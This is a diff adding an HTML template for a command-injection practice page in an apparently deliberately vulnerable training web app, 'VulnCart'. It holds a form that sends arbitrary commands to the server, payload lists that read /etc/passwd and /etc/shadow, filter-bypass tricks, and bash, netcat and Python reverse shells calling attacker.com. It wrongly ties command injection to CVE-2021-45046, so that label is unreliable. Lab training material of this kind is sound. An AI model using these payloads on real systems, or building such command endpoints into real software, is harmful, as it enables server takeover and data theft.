@@ -1,0 +1,236 @@
+{% extends "base.html" %}
+
+{% block title %}Command Injection Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2021-45046: Command Injection Vulnerability Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates command injection vulnerabilities for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>Command Injection Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>Command injection occurs when user input is passed to system commands without proper validation or sanitization.</p>
+                
+                <form method="POST" id="commandForm">
+                    <div class="mb-3">
+                        <label for="command" class="form-label">Command to Execute:</label>
+                        <input type="text" class="form-control" id="command" name="command" 
+                               placeholder="Enter command to execute..." value="whoami">
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Execute Command</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>Basic Commands:</h6>
+                <code>whoami</code><br>
+                <code>id</code><br>
+                <code>pwd</code><br>
+                <code>ls -la</code>
+                
+                <hr>
+                
+                <h6>Command Separators:</h6>
+                <code>; ls -la</code><br>
+                <code>&& cat /etc/passwd</code><br>
+                <code>| whoami</code><br>
+                <code>|| id</code>
+                
+                <hr>
+                
+                <h6>File Operations:</h6>
+                <code>cat /etc/passwd</code><br>
+                <code>head -10 /etc/shadow</code><br>
+                <code>find / -name "*.conf"</code>
+                
+                <hr>
+                
+                <h6>Network Commands:</h6>
+                <code>netstat -tuln</code><br>
+                <code>ps aux</code><br>
+                <code>uname -a</code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>Advanced Command Injection Techniques</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Command Chaining:</h6>
+                        <ul>
+                            <li><code>command1; command2</code> - Sequential execution</li>
+                            <li><code>command1 && command2</code> - Execute if first succeeds</li>
+                            <li><code>command1 || command2</code> - Execute if first fails</li>
+                            <li><code>command1 | command2</code> - Pipe output</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Bypass Techniques:</h6>
+                        <ul>
+                            <li><code>$(command)</code> - Command substitution</li>
+                            <li><code>`command`</code> - Backticks</li>
+                            <li><code>${IFS}command</code> - Internal Field Separator</li>
+                            <li><code>%0acommand</code> - URL encoding</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <h6>Reverse Shell Payloads:</h6>
+                        <pre><code># Bash reverse shell
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Netcat reverse shell
+nc -e /bin/bash attacker.com 4444
+
+# Python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2021-45046 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>Command injection occurs when user input is passed to system commands without proper validation, allowing attackers to execute arbitrary commands on the server.</p>
+                
+                <h6>Common Attack Vectors:</h6>
+                <ul>
+                    <li>System command execution</li>
+                    <li>File system access</li>
+                    <li>Network reconnaissance</li>
+                    <li>Privilege escalation</li>
+                    <li>Reverse shell establishment</li>
+                </ul>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Remote Code Execution (RCE)</li>
+                    <li>Complete system compromise</li>
+                    <li>Data exfiltration</li>
+                    <li>Privilege escalation</li>
+                    <li>Persistence establishment</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Use parameterized APIs instead of system commands</li>
+                    <li>Implement strict input validation</li>
+                    <li>Use allowlist for allowed commands</li>
+                    <li>Run applications with minimal privileges</li>
+                    <li>Use secure coding practices</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('commandForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const command = document.getElementById('command').value;
+        const resultDiv = document.getElementById('result');
+        
+        fetch('/command_injection', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'command=' + encodeURIComponent(command)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong><br>
+                    <pre>${data.result}</pre>
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    // Quick command buttons
+    const commands = [
+        {name: "Whoami", command: "whoami"},
+        {name: "ID", command: "id"},
+        {name: "PWD", command: "pwd"},
+        {name: "LS", command: "ls -la"},
+        {name: "Passwd", command: "cat /etc/passwd"},
+        {name: "Netstat", command: "netstat -tuln"},
+        {name: "Processes", command: "ps aux"},
+        {name: "System Info", command: "uname -a"}
+    ];
+    
+    commands.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('command').value = item.command;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+    
+    // Advanced payload buttons
+    const advancedCommands = [
+        {name: "Command Chain", command: "whoami; id; pwd"},
+        {name: "File Search", command: "find / -name '*.conf' 2>/dev/null | head -10"},
+        {name: "Network Info", command: "ifconfig || ip addr"},
+        {name: "User List", command: "cat /etc/passwd | grep -v nologin"}
+    ];
+    
+    advancedCommands.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-warning btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('command').value = item.command;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
